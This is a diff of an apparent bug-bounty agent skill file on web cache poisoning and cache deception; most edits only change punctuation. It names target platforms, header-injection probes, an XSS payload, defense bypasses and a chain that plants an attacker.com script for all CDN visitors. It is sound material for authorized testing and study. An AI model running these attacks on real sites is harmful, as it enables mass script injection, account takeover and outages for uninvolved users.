@@ -31,15 +31,15 @@ report_count: 8
 
 ## Crown Jewel Targets
 
-Cache poisoning is high-value because a single poisoned cache entry can affect thousands or millions of victims simultaneously — one request, mass exploitation. Payout scales with blast radius.
+Cache poisoning is high-value because a single poisoned cache entry can affect thousands or millions of victims simultaneously; one request, mass exploitation. Payout scales with blast radius.
 
 **Highest-value targets:**
-- **CDN-served assets** (cdn.shopify.com, cloudfront distributions, Fastly/Akamai edges) — impact depends on cache key, edge location, routing and actual consumers
-- **E-commerce platforms** with affiliate/referral flows (Shopify, WooCommerce storefronts) — session hijack or affiliate fraud potential
-- **Gaming platforms with update servers** (rockstargames updates.* domains) — DoS on update delivery = widespread client breakage
-- **Authentication endpoints** served through caches — leads to account takeover (the highest severity variant)
-- **Asset CDNs** (JS/CSS delivery) — XSS payload delivery at scale
-- **SaaS multi-tenant platforms** — one poisoned response bleeds into all tenants sharing a cache key
+- **CDN-served assets** (cdn.shopify.com, cloudfront distributions, Fastly/Akamai edges); impact depends on cache key, edge location, routing and actual consumers
+- **E-commerce platforms** with affiliate/referral flows (Shopify, WooCommerce storefronts); session hijack or affiliate fraud potential
+- **Gaming platforms with update servers** (rockstargames updates.* domains); DoS on update delivery = widespread client breakage
+- **Authentication endpoints** served through caches; leads to account takeover (the highest severity variant)
+- **Asset CDNs** (JS/CSS delivery); XSS payload delivery at scale
+- **SaaS multi-tenant platforms**; one poisoned response bleeds into all tenants sharing a cache key
 
 **Asset types that pay most:** CDN hostnames, subdomain-per-tenant patterns, update/download servers, login/account pages cached incorrectly, affiliate link shorteners.
 
@@ -47,9 +47,9 @@ Cache poisoning is high-value because a single poisoned cache entry can affect t
 
 ## Autonomous Testing Priority
 
-**Two distinct attacks live under this skill — target the simpler one first.**
+**Two distinct attacks live under this skill; target the simpler one first.**
 
-**Attack 1 — Password Reset Poisoning (Host header injection):**
+**Attack 1; Password Reset Poisoning (Host header injection):**
 
 The app uses the `Host` header to construct the password reset link in the email. Inject an attacker-controlled hostname; the victim's reset email contains a link to your server.
 
@@ -66,9 +66,9 @@ email=owned-test-user@example.test
 
 Use a distinctive hostname you control or can identify in the response. **Proof:** the injected hostname appears in the response body (some apps reflect the generated reset link), and the reset email received by your owned test account contains that hostname. A 2xx response or reflected marker alone does not prove the link was sent or usable.
 
-Try multiple host headers — apps vary in which one they trust (`X-Forwarded-Host` is most common, but `Host` itself also works when the proxy passes it through).
+Try multiple host headers; apps vary in which one they trust (`X-Forwarded-Host` is most common, but `Host` itself also works when the proxy passes it through).
 
-**Attack 2 — Web Cache Poisoning:**
+**Attack 2; Web Cache Poisoning:**
 
 Inject the attacker-controlled hostname into `X-Forwarded-Host` on a GET request for a cacheable page. If the hostname is reflected in the response body AND the response gets cached, subsequent visitors receive the poisoned response.
 
@@ -121,7 +121,7 @@ X-HTTP-Method-Override
 
 1. **Map cache infrastructure.** Send a GET to the target and inspect response headers. Identify the caching layer (Cloudflare, Fastly, Varnish, Nginx). Note `Age`, `X-Cache`, `CF-Cache-Status` headers.
 
-2. **Identify cache key components.** Send two identical requests — if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).
+2. **Identify cache key components.** Send two identical requests; if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).
 
 3. **Test unkeyed header reflection.** Add `X-Forwarded-Host: evil.com` and check if the value appears in the response body (redirects, canonical links, CSP headers, JS src attributes, meta tags). Append a unique cache-busting query parameter (e.g. `?cb=<random>`) only after proving this parameter is included in the cache key. An ignored parameter does not isolate a probe and can poison the normal public entry. (Param Miner's "Guess headers" mode is the canonical Burp tool for discovering these unkeyed headers/parameters automatically.)
 
@@ -140,7 +140,7 @@ X-HTTP-Method-Override
    - `GET /page?utm_source="><script>alert(1)</script>`
    Check if the param is reflected and cached for clean requests to `/page`.
 
-7. **Validate cache storage.** After sending a potentially poisoned request, immediately request the same URL WITHOUT the malicious header from a different IP or incognito session. If you receive the poisoned response — it's confirmed.
+7. **Validate cache storage.** After sending a potentially poisoned request, immediately request the same URL WITHOUT the malicious header from a different IP or incognito session. If you receive the poisoned response; it's confirmed.
 
 8. **Measure cache TTL.** Check `Cache-Control: max-age` and `Age` to understand how long the poison persists and whether it's exploitable before expiry.
 
@@ -236,7 +236,7 @@ Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Acces
 
 ## Common Root Causes
 
-1. **CDN misconfiguration — caching based on URL path only.** Engineers configure cache rules like "cache everything matching `*.js`" without realizing the path can be appended to dynamic routes. The origin server ignores the extra path segments, but the CDN uses them as cache keys.
+1. **CDN misconfiguration; caching based on URL path only.** Engineers configure cache rules like "cache everything matching `*.js`" without realizing the path can be appended to dynamic routes. The origin server ignores the extra path segments, but the CDN uses them as cache keys.
 
 2. **Unkeyed header forwarding.** Developers configure reverse proxies to forward `X-Forwarded-Host` to backends for URL generation (canonical links, redirects, password reset emails) without including it in the cache key. The CDN caches the poisoned response.
 
@@ -248,7 +248,7 @@ Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Acces
 
 6. **Lazy `Vary` header implementation.** Developers know they should add `Vary: X-Forwarded-Host` but forget, or CDNs strip/ignore `Vary` headers entirely (Cloudflare historically strips Vary on some asset types).
 
-7. **Third-party integrations with URL reflection.** Affiliate/link tracking systems (like Shopify Linkpop) reflect the destination URL in metadata, canonical tags, or redirects — and these get cached globally.
+7. **Third-party integrations with URL reflection.** Affiliate/link tracking systems (like Shopify Linkpop) reflect the destination URL in metadata, canonical tags, or redirects; and these get cached globally.
 
 ---
 
@@ -261,14 +261,14 @@ Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Acces
 
 **Defense: Stripping attacker-supplied headers at edge**
 - Bypass: Use HTTP/2 pseudo-header manipulation if the proxy downgrades to HTTP/1.1
-- Bypass: Inject via HTTP Request Smuggling — smuggle a request with poison headers past the WAF to hit the cache server directly
+- Bypass: Inject via HTTP Request Smuggling; smuggle a request with poison headers past the WAF to hit the cache server directly
 
 **Defense: Require authentication before caching**
-- Bypass: Web Cache Deception — trick the cache into storing authenticated content by appending `.css`/`.js` to the URL, which matches a cache rule that ignores auth
+- Bypass: Web Cache Deception; trick the cache into storing authenticated content by appending `.css`/`.js` to the URL, which matches a cache rule that ignores auth
 
 **Defense: Cache key includes full URL with query string**
-- Bypass: HTTP Parameter Pollution — some parsers take the first occurrence, caches key on full string; a parser or normalization mismatch must be demonstrated; two different fully keyed query strings do not by themselves share an entry
-- Bypass: Fat GET request — send body parameters that the backend processes but the cache ignores
+- Bypass: HTTP Parameter Pollution; some parsers take the first occurrence, caches key on full string; a parser or normalization mismatch must be demonstrated; two different fully keyed query strings do not by themselves share an entry
+- Bypass: Fat GET request; send body parameters that the backend processes but the cache ignores
 
 **Defense: Short TTL / rapid cache purging**
 - Measure only the isolated lab entry and coordinate purge/expiry with the owner. Do not continuously re-poison or route around mitigations on shared production caches.
@@ -282,7 +282,7 @@ Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Acces
 ## Gate 0 Validation
 
 1. **What can the attacker DO right now?**
-   The attacker must be able to poison a cache entry and then demonstrate that a *separate, unauthenticated request* from a different client/IP receives the poisoned response — not just their own browser. If only the attacker sees the effect, it's not cache poisoning.
+   The attacker must be able to poison a cache entry and then demonstrate that a *separate, unauthenticated request* from a different client/IP receives the poisoned response; not just their own browser. If only the attacker sees the effect, it's not cache poisoning.
 
 2. **What does the victim LOSE?**
    Must be one of: (a) session/account compromise via reflected credentials in poisoned response, (b) execution of attacker-controlled JS via poisoned asset, (c) service denial where legitimate requests return error responses, or (d) sensitive data disclosure (account details cached and served to other users). "Weird response headers" alone is not impact.
@@ -294,13 +294,13 @@ Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Acces
 
 ## Real Impact Examples
 
-**Scenario 1 — Mass DoS on CDN Asset Delivery (Shopify CDN)**
-An attacker identified that CDN-served JavaScript assets on `cdn.shopify.com` could be poisoned by sending a request with a crafted header that caused the origin to return a 4xx error. The CDN cached this error response. Any merchant storefront loading that asset then received the cached error instead of the valid JS file — breaking checkout flows and storefront functionality across all stores sharing that CDN path. One HTTP request, global merchant impact, persisting until cache TTL expired.
+**Scenario 1; Mass DoS on CDN Asset Delivery (Shopify CDN)**
+An attacker identified that CDN-served JavaScript assets on `cdn.shopify.com` could be poisoned by sending a request with a crafted header that caused the origin to return a 4xx error. The CDN cached this error response. Any merchant storefront loading that asset then received the cached error instead of the valid JS file; breaking checkout flows and storefront functionality across all stores sharing that CDN path. One HTTP request, global merchant impact, persisting until cache TTL expired.
 
-**Scenario 2 — Account Takeover via Web Cache Deception**
-On a platform serving authenticated account pages, an attacker crafted a URL like `/account/profile/photo.jpg` and sent it to a victim (via phishing link). When the victim (authenticated) visited the URL, the server responded with their full account profile page (name, email, session tokens). Because the URL ended in `.jpg`, the CDN cached the authenticated response publicly. The attacker then fetched `/account/profile/photo.jpg` without authentication and received the victim's account data — enabling full account takeover. Impact was amplified because the cache served the same response to any subsequent requester.
+**Scenario 2; Account Takeover via Web Cache Deception**
+On a platform serving authenticated account pages, an attacker crafted a URL like `/account/profile/photo.jpg` and sent it to a victim (via phishing link). When the victim (authenticated) visited the URL, the server responded with their full account profile page (name, email, session tokens). Because the URL ended in `.jpg`, the CDN cached the authenticated response publicly. The attacker then fetched `/account/profile/photo.jpg` without authentication and received the victim's account data; enabling full account takeover. Impact was amplified because the cache served the same response to any subsequent requester.
 
-**Scenario 3 — Affiliate Link Hijacking via URL Path Manipulation (Shopify Linkpop)**
+**Scenario 3; Affiliate Link Hijacking via URL Path Manipulation (Shopify Linkpop)**
 An attacker discovered that the Linkpop affiliate link service would cache responses based on URL path but reflected a manipulated product destination URL in the cached HTML. By visiting a specially crafted path before legitimate users, the attacker poisoned the cache to redirect affiliate clicks to an attacker-controlled domain instead of the legitimate Amazon product. Victims clicking what appeared to be valid merchant links were sent to attacker infrastructure, enabling credential phishing and loss of affiliate commission revenue for the legitimate merchant.
 
 ---
@@ -309,62 +309,62 @@ An attacker discovered that the Linkpop affiliate link service would cache respo
 
 The following are upstream-attributed historical case summaries; amounts, details and links have not been independently revalidated in this static review and are not current target evidence. Spans the two major families: cache **poisoning** (attacker influences a cached response served to victims) and cache **deception** (attacker tricks the cache into storing a victim's private response).
 
-1. **Shopify — Cache poisoning via X-Forwarded-Host** ([H1 #977851](https://hackerone.com/reports/977851))
+1. **Shopify; Cache poisoning via X-Forwarded-Host** ([H1 #977851](https://hackerone.com/reports/977851))
     - Subclass: X-Forwarded-Host header poisoning (unkeyed input → redirect/script-src corruption)
-    - Payload: `GET /any-path` with `X-Forwarded-Host: attacker.com` — single request persisted attacker host in cached response across `apps.shopify.com` and localized subdomains
+    - Payload: `GET /any-path` with `X-Forwarded-Host: attacker.com`; single request persisted attacker host in cached response across `apps.shopify.com` and localized subdomains
     - Root cause: X-Forwarded-Host influenced asset/redirect URL generation but was NOT part of the cache key
-    - Year: 2020 — **$1,300 → escalated to $6,300** (one-shot poison, multi-host blast radius)
+    - Year: 2020; **$1,300 → escalated to $6,300** (one-shot poison, multi-host blast radius)
 
-2. **HackerOne — Cache poisoning DoS via X-Forwarded-Port** ([H1 #409370](https://hackerone.com/reports/409370))
+2. **HackerOne; Cache poisoning DoS via X-Forwarded-Port** ([H1 #409370](https://hackerone.com/reports/409370))
     - Subclass: X-Forwarded-Host / X-Forwarded-Port DoS (poisoned redirect to invalid port)
-    - Payload: `GET /<redirect-path>` with `X-Forwarded-Port: 1` — cached 301 redirect pointed legitimate users at port 1, breaking access
+    - Payload: `GET /<redirect-path>` with `X-Forwarded-Port: 1`; cached 301 redirect pointed legitimate users at port 1, breaking access
     - Root cause: trusted X-Forwarded-* headers in 301 redirect generation; cache stored the bad Location
-    - Year: 2018 — **$2,500** (foundational H1-on-H1 case)
+    - Year: 2018; **$2,500** (foundational H1-on-H1 case)
 
-3. **GitLab — Cache poisoning DoS via X-HTTP-Method-Override** ([H1 #1160407](https://hackerone.com/reports/1160407))
+3. **GitLab; Cache poisoning DoS via X-HTTP-Method-Override** ([H1 #1160407](https://hackerone.com/reports/1160407))
     - Subclass: method-cloaking / GCS cache-key bleed (HEAD response stored under GET key)
-    - Payload: `GET /assets/webpack/*.js` with `X-HTTP-Method-Override: HEAD` — GCS backend honored the override and returned an empty body; CDN cached it as the canonical GET response
+    - Payload: `GET /assets/webpack/*.js` with `X-HTTP-Method-Override: HEAD`; GCS backend honored the override and returned an empty body; CDN cached it as the canonical GET response
     - Root cause: CDN cache not method-aware; HEAD body (empty) overwrote GET entry for cached static assets
-    - Year: 2021 — **$2,500** (DoS normally OOS, paid for novelty)
+    - Year: 2021; **$2,500** (DoS normally OOS, paid for novelty)
 
-4. **PayPal — Web Cache Deception (Omer Gil original)** ([Blog](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html))
+4. **PayPal; Web Cache Deception (Omer Gil original)** ([Blog](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html))
     - Subclass: classic WCD via `.css`/`.jpg`/etc. path appending on authenticated routes
-    - Payload: `GET https://www.paypal.com/myaccount/home/foo.css` — origin served full authenticated account page; CDN cached it as "static .css" for ~5 hours
+    - Payload: `GET https://www.paypal.com/myaccount/home/foo.css`; origin served full authenticated account page; CDN cached it as "static .css" for ~5 hours
     - Root cause: origin routed unknown path suffixes to the parent dynamic handler; CDN cached based purely on the static-looking file extension
-    - Year: 2017 — **$3,000** (PortSwigger Top-10 Web Hacking Technique of 2017, #2)
+    - Year: 2017; **$3,000** (PortSwigger Top-10 Web Hacking Technique of 2017, #2)
 
-5. **Cloudflare PBB — Cache Deception Armor bypass via `.avif`** ([H1 #1391635](https://hackerone.com/reports/1391635))
+5. **Cloudflare PBB; Cache Deception Armor bypass via `.avif`** ([H1 #1391635](https://hackerone.com/reports/1391635))
     - Subclass: CDN-specific allowlist bypass (Cloudflare's WCD protection feature) using an obscure image extension
-    - Payload: `GET https://<protected-origin>/account/me.avif` — Cloudflare's Cache Deception Armor extension list omitted `.avif`, so the authenticated HTML response was cached
+    - Payload: `GET https://<protected-origin>/account/me.avif`; Cloudflare's Cache Deception Armor extension list omitted `.avif`, so the authenticated HTML response was cached
     - Root cause: Cache Deception Armor used a static, incomplete extension allowlist that did not cover modern image MIME types
-    - Year: 2022 — Cloudflare PBB bounty (amount undisclosed)
+    - Year: 2022; Cloudflare PBB bounty (amount undisclosed)
 
-6. **Akamai (PayPal/Airbnb/Goldman Sachs) — Hop-by-hop header smuggling → server-side edge poisoning** ([Tediosi & Mariani writeup](https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b))
+6. **Akamai (PayPal/Airbnb/Goldman Sachs); Hop-by-hop header smuggling → server-side edge poisoning** ([Tediosi & Mariani writeup](https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b))
     - Subclass: CDN-specific request-smuggling that lands attacker responses in Akamai's edge cache for nearby IPs
-    - Payload: `Connection: Content-Length` + crafted request — Akamai's first proxy stripped Content-Length as hop-by-hop, second proxy treated body as a second request whose response was cached at the edge
+    - Payload: `Connection: Content-Length` + crafted request; Akamai's first proxy stripped Content-Length as hop-by-hop, second proxy treated body as a second request whose response was cached at the edge
     - Root cause: inconsistent handling of hop-by-hop headers across Akamai proxy tiers caused desync; smuggled responses were server-side cached globally
-    - Year: 2022 — **>$50K total** across affected programs (PayPal $25,200 + Airbnb $14,875 + Goldman Sachs $100), PortSwigger Top-10 Web Hacking Techniques 2022 nominee
+    - Year: 2022; **>$50K total** across affected programs (PayPal $25,200 + Airbnb $14,875 + Goldman Sachs $100), PortSwigger Top-10 Web Hacking Techniques 2022 nominee
 
-7. **James Kettle (PortSwigger) — "Gotta cache 'em all": path-normalization & WCD against Cloudflare/Fastly/GCP** ([PortSwigger Research](https://portswigger.net/research/gotta-cache-em-all))
-    - Subclass: cache-key path normalization discrepancies and Web Cache Deception across major CDNs (Cloudflare, Fastly, GCP/Google Cloud) — the 2024 research named in this skill's description
+7. **James Kettle (PortSwigger); "Gotta cache 'em all": path-normalization & WCD against Cloudflare/Fastly/GCP** ([PortSwigger Research](https://portswigger.net/research/gotta-cache-em-all))
+    - Subclass: cache-key path normalization discrepancies and Web Cache Deception across major CDNs (Cloudflare, Fastly, GCP/Google Cloud); the 2024 research named in this skill's description
     - Payload: origin-vs-cache delimiter/normalization disagreements (e.g. encoded path segments and static-suffix tricks) that cause the cache to store a dynamic/authenticated response under a static-looking key
     - Root cause: cache and origin disagree on how to normalize/parse the URL path, so the cache key does not match the resource the origin actually served
-    - Year: 2024 — coordinated CDN-vendor disclosure; methodology research (no single bounty), PortSwigger Top-10 Web Hacking Techniques 2024 entry
+    - Year: 2024; coordinated CDN-vendor disclosure; methodology research (no single bounty), PortSwigger Top-10 Web Hacking Techniques 2024 entry
 
 ---
 
 ## Related Skills & Chains
 
-- **`hunt-xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
-- **`hunt-http-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
-- **`hunt-auth-bypass`** — Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
-- **`security-arsenal`** — Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
-- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the poisoned response MUST be reproducible from a separate IP/incognito without your poison headers. If only your own browser sees the effect, it's a self-cache and N/A.
+- **`hunt-xss`**; Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
+- **`hunt-http-smuggling`**; Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
+- **`hunt-auth-bypass`**; Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
+- **`security-arsenal`**; Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
+- **`triage-validation`**; Run the Pre-Severity Gate before claiming Critical: the poisoned response MUST be reproducible from a separate IP/incognito without your poison headers. If only your own browser sees the effect, it's a self-cache and N/A.
 
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
 
 ## Limitations
 
